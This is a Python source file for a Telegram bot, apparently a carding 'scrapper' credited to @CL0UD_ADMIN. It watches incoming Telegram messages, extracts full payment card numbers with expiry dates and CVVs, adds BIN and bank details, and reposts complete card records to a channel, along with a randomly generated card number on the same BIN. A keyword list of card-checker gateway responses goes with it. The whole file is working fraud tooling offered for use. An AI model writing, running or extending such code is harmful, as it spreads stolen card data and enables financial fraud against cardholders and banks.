import re
import datetime
import asyncio
import random
import telebot
from telethon import TelegramClient, events
from os import system, name
from bin import get_bin_info
from apis import apid, apihasd, token

client = TelegramClient('scrapfree', apid, apihasd)
client.parse_mode = 'html'
bot = telebot.TeleBot(token, parse_mode="html")

id_channel = -1002450247913
id_alert_channel = -1002432179007

keywords = ['Card Issuer Declined CVV', 'Approved! ✅', 'Card Issuer Declined CVV', '1000: Approved', 'CVC Declined ', 'CVV2 DECLINED', '𝒔𝒖𝒄𝒄𝒆𝒆𝒅𝒆𝒅', '𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 -» 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅', ' CVV_NOT_PROCESSED', 'Request was processed successfully.', 'Invalid Card Verification Number (CVN)', 'succeeded', 'DECLINED CVV2', 'Gateway Rejected: cvv', "Your card's security code is incorrect", '1000 Approved', 'Insufficient Funds', 'Your card has insufficient funds', 'Gateway Rejected: avs_and_cvv', 'Verified', 'CVV_MATCHED']

cards_process = {}
processed_ccs = set()

async def send_card(cc, mes, ano, cvv, x):
    await asyncio.sleep(31.5)
    random_digits = "".join(random.choice("0123456789") for _ in range(6))
    random_month = random.randint(1, 12)
    random_year = random.randint(2025, 2030)
    
    text = f"""<b><a href="https://raw.githubusercontent.com/VSXX-SCRP/Code/main/scrp.jpg">&#8203;</a>
[<a href="https://t.me/+CqNAreUKC_tiYzFh">么</a>] 𝐕𝐒𝐗𝐗 𝐒𝐂𝐑𝐀𝐏𝐏𝐄𝐑  - 【 𝐅𝐑𝐄𝐄 】 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/+CqNAreUKC_tiYzFh">么</a>] #bin{cc[:6]}
━━━━━━━━━━━━━━━━
[<a href="https://t.me/+CqNAreUKC_tiYzFh">么</a>] CC ➫ <code>{cc}|{mes}|{ano}|{cvv}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/+CqNAreUKC_tiYzFh">么</a>] Country ➫ <code>{x.get("country")}</code> | <code>{x.get("flag")}</code>
[<a href="https://t.me/+CqNAreUKC_tiYzFh">么</a>] Type ➫ <code>{x.get("type")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/+CqNAreUKC_tiYzFh">么</a>] Level ➫ <code>{x.get("level")}</code>
[<a href="https://t.me/+CqNAreUKC_tiYzFh">么</a>] Bank ➫ <code>{x.get("bank_name")}</code> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/+CqNAreUKC_tiYzFh">么</a>] Extra ➫ <code>{cc[:6]}{random_digits}xxxx|{random_month:02d}|{random_year}|rnd</code>
[<a href="https://t.me/+CqNAreUKC_tiYzFh">么</a>] Powered by ➫ <a href="https://t.me/CL0UD_ADMIN">@CL0UD_ADMIN 🥀</a>
</b>"""
    try:
        bot.send_message(id_channel, text, parse_mode="HTML")
    except:
        bot.send_message(id_channel, text, disable_web_page_preview=True)

@client.on(events.NewMessage)
async def edited_event(event):
    if not event.raw_text or event.date.year <= 2025:
        return
    
    text_msg = event.raw_text
    card_pattern = re.compile(r'\b(\d{16})\|(\d{2})\|(\d{4})\|(\d{3})\b')
    matches = card_pattern.findall(text_msg)
    
    if not matches:
        return

    cc, mes, ano, cvv = matches[0]
    
    if cc in processed_ccs or cards_process.get(cc, 0) >= 3:
        return

    x = get_bin_info(cc[:6])
    processed_ccs.add(cc)
    cards_process[cc] = cards_process.get(cc, 0) + 1
    
    asyncio.create_task(send_card(cc, mes, ano, cvv, x))

async def main():
    system('cls' if name == 'nt' else 'clear')
    print('@CL0UD_ADMIN')
    await client.start()
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
